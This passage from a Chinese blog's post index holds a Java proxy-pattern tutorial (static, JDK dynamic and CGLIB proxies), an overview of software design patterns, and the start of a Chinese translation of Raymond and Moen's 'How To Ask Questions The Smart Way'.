接口被代理类和代理类都需要实现该接口。代理类需要将该接口作为属性，实例化时需要传入该接口的对象，这样该代理类就可以实现代理所有实现Movable的类了。\n接口在这里的目的就是起一个规范作用保证被代理类和代理类都实现了move()方法。\n优点：可以代理所有实现接口的类\n缺点：被代理的类必须实现接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.dm.vulhub.Ser; public class Tank implements Movable{ @Override public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { Tank tank = new Tank(); new LogProxy(tank).move(); } } class LogProxy implements Movable{ private Movable movable; public LogProxy(Movable movable) { this.movable = movable; } @Override public void move() { System.out.println(\u0026#34;方法执行前....\u0026#34;); movable.move(); System.out.println(\u0026#34;方法执行后....\u0026#34;); } } interface Movable { void move(); } 动态代理 动态代理其实本质还是将被代理类包装一层，生成一个具有新的相同功能的代理类。但是与静态代理不同的是，这个代理类我们自己定义的。而动态代理这个代理类是根据我们的提示动态生成的。\n相比于静态代理，动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。\n实现动态代理有三种方案\nJDK动态代理 通过java提供的Proxy类帮我们创建代理对象\n优点：可以生成所有实现了口的代理对象，并且最重要的是，可以对被代理类的所有方法做拦截处理\n缺点：JDK反射生成代理必须面向接口, 这是由Proxy的原理决定的。生成代理的方法中你必须指定实现类的接口，它根据这个接口来实现代理类生成的所实现的接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.dm.vulhub.Ser; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class Tank implements Movable{ @Override public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { Tank tank = new Tank(); Movable o = (Movable)Proxy.newProxyInstance( Tank.class.getClassLoader() ,new Class[]{Movable.class} ,new LogProxy(tank)); o.move(); } } class LogProxy implements InvocationHandler { private Movable movable; public LogProxy(Movable movable) { this.movable = movable; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;方法:\u0026#34;+method.getName()+\u0026#34;()执行前\u0026#34;); Object invoke = method.invoke(movable, args); // 此处相当于 movable.move() System.out.println(\u0026#34;方法:\u0026#34;+method.getName()+\u0026#34;()执行后\u0026#34;); return invoke; } } interface Movable { void move(); } Proxy.newProxyInstance的传参是实现的关键\nnewProxyInstance(): 创建代理对象\n参数一: 被代理类对象\n参数二：接口类对象 被代理对象所实现的接口\n参数三：调用处理器。 被调用对象方法被调用后该如何处理\nJDK实现原理 我们可以在main函数的最开始添加这段代码\n1 2 import sun.misc.ProxyGenerator; System.setProperty(\u0026#34;sun.misc.ProxyGenerator.saveGeneratedFiles\u0026#34;, \u0026#34;true\u0026#34;); main函数最后添加这段代码\n1 2 3 4 5 try { Thread.sleep(new Random().nextInt(90000)); } catch (InterruptedException e) { throw new RuntimeException(e); } 然后直接执行，可以看到项目中出现了一些中间文件\n这个自动生成的class文件源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.dm.vulhub.Ser; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.lang.reflect.UndeclaredThrowableException; final class $Proxy0 extends Proxy implements Movable { private static Method m1; private static Method m3; private static Method m2; private static Method m0; static { try { m1 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;equals\u0026#34;, Class.forName(\u0026#34;java.lang.Object\u0026#34;)); m3 = Class.forName(\u0026#34;org.dm.vulhub.Ser.Movable\u0026#34;).getMethod(\u0026#34;move\u0026#34;); m2 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;toString\u0026#34;); m0 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;hashCode\u0026#34;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final void move() throws { try { super.h.invoke(this, m3, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } } 可以看到14-17行和每个函数的具体实现，是使用静态代理的组合方式进行的具体实现。\n这也就解释了为什么需要被代理对象必须实现接口，如果没有实现接口，代理类就不能确定需要实现哪些方法进行方法层面的代理。\nCGLIB动态代理 CGLib(Code Generate Library) 与JDK动态代理不同的是，cglib生成代理是被代理对象的子类。\n因此它拥有继承方法实现静态代理的\n优点：不需要被代理对象实现某个接口。\n缺点：不能给final类生成代理，因为final类无法拥有子类。\n使用cglib生成代理类也很简单，只要指定父类和回调方法即可\n首先需要引入依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;cglib\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;cglib\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 然后完整代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package org.dm.vulhub.Ser; import net.sf.cglib.proxy.Enhancer; import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; class TimeMethodInterceptor implements MethodInterceptor{ @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable { System.out.println(\u0026#34;生成的类名\u0026#34;+o.getClass().getName()); System.out.println(\u0026#34;生成的类的父类\u0026#34;+o.getClass().getSuperclass().getName()); System.out.println(\u0026#34;方法执行前，被代理的方法\u0026#34;+method.getName()); Object result = null; result = methodProxy.invokeSuper(o, objects); System.out.println(\u0026#34;方法执行后，被代理的方法\u0026#34;+method.getName()); return result; } } class Tank{ public void move(){ System.out.println(\u0026#34;Tank moving clacla....\u0026#34;); } public static void main(String[] args) { Enhancer enhancer = new Enhancer(); // 增强者 enhancer.setSuperclass(Tank.class); // 指定父类 enhancer.setCallback(new TimeMethodInterceptor()); // 当被代理对象的方法调用的时候会调用 该对象的intercept Tank tank = (Tank)enhancer.create(); // 动态代理的生成 tank.move(); // 生成之后会调用 } } SpringAop 待补充！！！！\n","date":"2024-07-28T01:05:01+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240728010634169.png","permalink":"https://d4n-sec.github.io/p/javaproxystudy/","title":"Java代理模式"},{"content":"设计模式 设计模式简介 设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。\n设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。\n毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。\n设计模式来源 设计模式这个术语是上个世纪90年代由Erich Gamma、Richard Helm、Raplh Johnson和Jonhn Vlissides四个人总结提炼出来的，并且写了一本 Design Patterns 的书。这四人也被称为四人帮（GoF）。\n他们所提出的设计模式主要是基于以下的面向对象设计原则：\n对接口编程而不是对实现编程 优先使用对象组合而不是继承 设计模式优点 提供了一种共享的设计词汇和概念，使开发人员能够更好地沟通和理解彼此的设计意图。 提供了经过验证的解决方案，可以提高软件的可维护性、可复用性和灵活性。 促进了代码的重用，避免了重复的设计和实现。 通过遵循设计模式，可以减少系统中的错误和问题，提高代码质量。 基本原则 设计模式基于以下几个原则，可以跳过，不影响学习设计模式\n开闭原则 Open Close Principle 对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。\n简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。\n里氏代换原则 Liskov Substitution Principle（LSP） 任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。\n里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。\n依赖倒转原则 Dependence Inversion Principle 开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。\n接口隔离原则 Interface Segregation Principle 使用多个隔离的接口，比使用单个接口要好。\n它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。\n最少知道原则 Demeter Principle 又称迪米特法则，是指一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。\n合成复用原则 Composite Reuse Principle 是指：尽量使用合成/聚合的方式，而不是使用继承。\n设计模式的分类 参考四人帮的书籍： Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 - 可复用的面向对象软件元素）\n创建型模式 这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式，而不是使用 new 运算符直接实例化对象。这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。\n包含：\n工厂模式（Factory Pattern） 抽象工厂模式（Abstract Factory Pattern） 单例模式（Singleton Pattern） 建造者模式（Builder Pattern） 原型模式（Prototype Pattern） 结构型模式 这些模式关注对象之间的组合和关系，旨在解决如何构建灵活且可复用的类和对象结构。\n包含：\n适配器模式（Adapter Pattern） 桥接模式（Bridge Pattern） 过滤器模式（Filter、Criteria Pattern）（非主流的分类） 组合模式（Composite Pattern） 装饰器模式（Decorator Pattern） 外观模式（Facade Pattern） 享元模式（Flyweight Pattern） 代理模式（Proxy Pattern） 行为型模式 这些模式关注对象之间的通信和交互，旨在解决对象之间的责任分配和算法的封装。\n包含：\n责任链模式（Chain of Responsibility Pattern） 命令模式（Command Pattern） 解释器模式（Interpreter Pattern） 迭代器模式（Iterator Pattern） 中介者模式（Mediator Pattern） 备忘录模式（Memento Pattern） 观察者模式（Observer Pattern） 状态模式（State Pattern） 空对象模式（Null Object Pattern）（非主流的分类） 策略模式（Strategy Pattern） 模板模式（Template Pattern） 访问者模式（Visitor Pattern） J2EE 模式 此项是非主流的分类，这些设计模式特别关注表示层。这些模式是由 Sun Java Center 鉴定的。\nMVC 模式（MVC Pattern） 业务代表模式（Business Delegate Pattern） 组合实体模式（Composite Entity Pattern） 数据访问对象模式（Data Access Object Pattern） 前端控制器模式（Front Controller Pattern） 拦截过滤器模式（Intercepting Filter Pattern） 服务定位器模式（Service Locator Pattern） 传输对象模式（Transfer Object Pattern） 设计模式主要是基于OOP编程提炼的，而OOP编程最典型的语言为Java，所以具体实例文章使用Java代码作为示例\n注意：本质是学习设计思维而非代码学习，所以需要一定的Java基础。\n补充 OOP：Object-oriented Programming，即面向对象编程\nGoF：Gang of Four，即四人帮\n参考链接 菜鸟\n","date":"2024-07-28T00:05:01+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240805210553120.png","permalink":"https://d4n-sec.github.io/p/designmode/","title":"程序的设计模式"},{"content":"如侵秒删\n提问的智慧 How To Ask Questions The Smart Way\nCopyright © 2001,2006,2014 Eric S. Raymond, Rick Moen\n本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。\n原文网址：http://www.catb.org/~esr/faqs/smart-questions.html\nCopyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu\n本中文指南是基于原文 3.10 版以及 2010 年由 Gasolin 所翻译版本的最新翻译；\n协助指出翻译问题，请发 issue，或直接发 pull request 给我。\n本文另有繁體中文版。\n原文版本历史 目录 声明 简介 在提问之前 当你提问时 慎选提问的论坛 Stack Overflow 网站和 IRC 论坛 第二步，使用项目邮件列表 使用有意义且描述明确的标题 使问题容易回复 使用清晰、正确、精准且合乎语法的语句 使用易于读取且标准的文件格式发送问题 精确地描述问题并言之有物 话不在多而在精 别动辄声称找到 Bug 低声下气不能代替你的功课 描述问题症状而非你的猜测 按发生时间先后列出问题症状 描述目标而不是过程 别要求使用私人电邮回复 清楚明确地表达你的问题以及需求 询问有关代码的问题时 别把自己家庭作业的问题贴上来 去掉无意义的提问句 即使你很急也不要在标题写紧急 礼多人不怪，而且有时还很有帮助 问题解决后，加个简短的补充说明 如何解读答案 RTFM 和 STFW：如何知道你已完全搞砸了 如果还是搞不懂 处理无礼的回应 如何避免扮演失败者 不该问的问题 好问题与蠢问题 如果得不到回答 如何更好地回答问题 相关资源 鸣谢 声明 许多项目在他们网站的帮助文档中链接了本指南。这很好，这正是我们想要的用途。但如果你是该项目管理员并试图创建指向本指南的超链接，请在超链接附近的显著位置注明：\n本指南不提供此项目的实际支持服务！\n我们已经深刻领教到缺少上述声明所带来的痛苦：我们将不停地被那些认为发布这本指南就意味着有责任解决世上所有技术问题的傻瓜苦苦纠缠。\n如果你因寻求某些帮助而阅读本指南，并在离开时还觉得可以从本文作者这里得到直接帮助，那你就是我们之前说的那些傻瓜之一。别问我们问题，我们只会忽略你。我们在这本指南中想教你如何从那些真正懂得你所遇到的软件或硬件问题的人处取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。\n简介 在黑客的世界里，你所提技术问题的解答的好坏, 很大程度上取决于你提问的方式与此问题的难度。本指南将教你如何正确地提问以获得你满意的答案。\n现在开源（Open Source）软件已经相当盛行，您通常可以从其他更有经验的用户那里获得与黑客一样好的答案，这是件好事；和黑客相比，用户们往往对那些新手常遇到的问题更宽容一些。尽管如此，以我们在此推荐的方式对待这些有经验的用户通常也是从他们那里获得有用答案的最有效方式。\n首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，“好问题！”是诚挚的大力称赞。\n尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。\n我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 失败者（loser） （由于历史原因，我们有时把它拼作 lusers）。\n我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们认可这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们只为那些真正有兴趣并愿意积极参与问题解决的人调整回答问题的风格。这点不会变，也不该变：否则，我们就是在最擅长的事情上降低效率。\n我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情地滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效地利用时间来回答赢家（winner）的问题。\n如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。\n所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 —— 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。\n如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 —— 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。\n（欢迎对本指南提出改进意见。你可以把你的建议发送至 esr@thyrsus.com 或 respond-auto@linuxmafia.com。然而请注意，本文并非网络礼节的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。\n在提问之前 在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：\n尝试在你准备提问的论坛的旧文章中搜索答案。 尝试上网搜索以找到答案。 尝试阅读手册以找到答案。 尝试阅读常见问题文件（FAQ）以找到答案。 尝试自己检查或试验以找到答案。 向你身边的强者朋友打听以找到答案。 如果你是程序开发者，请尝试阅读源代码以找到答案。 当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所学到的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。\n运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（搜索 Google 论坛和网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 我在 Google 中搜过下列句子但没有找到什么有用的东西 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。\n别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐得舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。\n准备好你的问题，再将问题仔细地思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。\n小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着蠢问题…，一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。\n绝不要自以为够格得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去挣到一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动地从他人处索取知识。\n另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。谁能给点提示？、我的这个例子里缺了什么？以及我应该检查什么地方比请把我需要的确切的过程贴出来更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。\n当你提问时 慎选提问的论坛 小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：\n在与主题不合的论坛上贴出你的问题。 在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。 在太多的不同新闻群组上重复转贴同样的问题（cross-post）。 向既非熟人也没有义务解决你问题的人发送私人电邮。 黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。\n因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括阅读 FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。\n向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 —— 如果你不确定，那就向别处发送，或者压根别发。\n在选择论坛、新闻群组或邮件列表时，别太相信它的名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。\n别像机关枪似的一次“扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。\n搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。\n一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。\n可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者由于涌入其私人邮箱的大量不堪忍受的无用邮件而不再提供支持。\nStack Overflow 搜索，然后在 Stack Exchange 问。\n近年来，Stack Exchange 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。\n因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的几率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。\n如果你还是找不到任何对你的问题有用的内容，请把你的问题发在与它最相关的网站上。提问的时候请善用格式化工具，尤其注意为代码添加格式，并且添加相关的标签（特别是编程语言、操作系统或库/包的名称）。当有人要求你提供更多相关信息时，请编辑你的贴子来补充它们[译注：而不是发一个回帖或回答！]。如果你觉得一个答案对你有帮助，点击向上的箭头来为它投票；如果一个答案提供了问题的正确解决方案，点击投票按钮下方的对勾来将它标记为正解。\nStack Exchange 已经成长到超过一百个网站，以下是最常用的几个站：\nSuper User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。 Stack Overflow 是问写程序有关的问题。 Server Fault 是问服务器和网管相关的问题。 网站和 IRC 论坛 本地的用户群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表），这些都是开始提问的好地方，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。\n事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复“使用我们的版本”。\n在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。\n通过论坛或 IRC 频道来提供用户支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。\n在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。\n第二步，使用项目邮件列表 当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：\n任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，那这也不能成为骚扰个别开发者的理由。 向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。 大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其他人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。 如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。 如果一个项目既有“用户”也有“开发者”（或“黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向“用户”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。\n然而，如果你确信你的问题很特别，而且在“用户”列表或论坛中几天都没有回复，可以试试前往“开发者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）\n如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。\n使用有意义且描述明确的标题 在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的帮帮忙、跪求、急（更别说救命啊！！！！这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。\n一个好标题范例是目标 —— 差异式的描述，许多技术支持组织就是这样做的。在目标部分指出是哪一个或哪一组东西有问题，在差异部分则描述与期望的行为不一致的地方。\n蠢问题：救命啊！我的笔记本电脑不能正常显示了！\n聪明问题：X.org 6.8.1 的鼠标指针会变形，某牌显卡 MV1005 芯片组。\n更聪明问题：X.org 6.8.1 的鼠标指针，在某牌显卡 MV1005 芯片组环境下 - 会变形。\n编写目标 —— 差异 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标指针或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境和你遇到的问题。\n总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。\n如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 Re: 测试 或者 Re: 新 bug 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。\n对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许用户按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。\n仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。\n在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你只想在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。\n使问题容易回复 以请将你的回复发送到……来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，换个好点的；如果是操作系统不支持这种邮件程序，也换个好点的。\n在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如追踪此讨论串、有回复时发送邮件提醒等功能。\n使用清晰、正确、精准且合乎语法的语句 我们从经验中发现，粗心的提问者通常也会粗心地写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。\n正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它必须很准确，而且有迹象表明你是在思考和关注问题。\n正确地拼写、使用标点和大小写，不要将its混淆为it's，loose搞成lose或者将discrete弄成discreet。不要全部用大写，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。Alan Cox 